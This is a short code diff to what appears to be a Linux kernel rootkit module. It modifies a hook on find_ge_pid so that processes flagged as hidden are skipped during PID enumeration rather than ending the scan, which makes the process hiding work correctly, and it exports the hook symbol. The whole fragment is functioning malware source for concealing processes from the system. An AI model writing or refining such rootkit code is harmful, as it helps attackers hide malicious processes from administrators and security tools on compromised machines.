@@ -103,15 +103,16 @@ static bool is_hidden_proc(pid_t pid)
 static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 {
     struct pid *pid = real_find_ge_pid(nr, ns);
+
     while (pid && is_hidden_proc(pid->numbers->nr))
     {
         printk(KERN_INFO "@ %s pid(%d) is hidden \n",
             __func__, pid->numbers->nr);
-        // pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
-        return NULL;
+        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
     }
     return pid;
 }
+EXPORT_SYMBOL(hook_find_ge_pid);
 
 static void init_hook(void)
 {
